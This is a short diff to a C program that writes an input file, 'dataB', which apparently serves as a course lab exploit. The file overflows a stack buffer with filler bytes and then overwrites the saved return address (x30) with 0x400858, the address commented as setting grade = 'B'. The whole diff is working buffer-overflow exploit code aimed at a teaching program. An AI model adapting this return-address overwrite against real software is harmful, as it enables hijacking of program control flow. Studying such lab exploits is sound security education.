@@ -3,6 +3,9 @@
 int main(void)
 {
     FILE *psFile;
+    unsigned long ulData;
+
+    ulData = 0x400858; /* address of grade = 'B'; */
     psFile = fopen("dataB", "w");
 
     /* buf[0 - 17] */
@@ -10,6 +13,10 @@ int main(void)
     /* buf[18] */
     fprintf(psFile, "%c", '\0');
     /* buf[19-47] */
-    fprintf(psFile, "fillerfillerfillerfillerfill");
+    fprintf(psFile, "fillerfillerfillerfillerfille");
+    /* buf[48-55] (x30) */
+    fwrite(&ulData, sizeof(unsigned long), 1, psFile);
+    /* buf[56] (x30) */
+    fprintf(psFile, "%c", '\n');
     return 0;
 }
